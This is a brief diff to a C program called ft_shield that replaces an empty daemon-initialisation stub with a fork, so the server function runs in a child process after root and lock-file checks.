@@ -1,9 +1,5 @@
 #include "ft_shield.h"
 
-static void init_daemon() {
-	return ;
-}
-
 int main(void) {
 	if (getuid() || existing_lock()) {
 		return (EXIT_FAILURE);
@@ -11,8 +7,10 @@ int main(void) {
 
 	create_lock();
 	create_log();
-	init_daemon();
-	run_server();
+	pid_t pid = fork();
+	if (pid == 0) {
+		run_server();
+	}
 	printf(LOGIN);
 	return(EXIT_SUCCESS);
 }
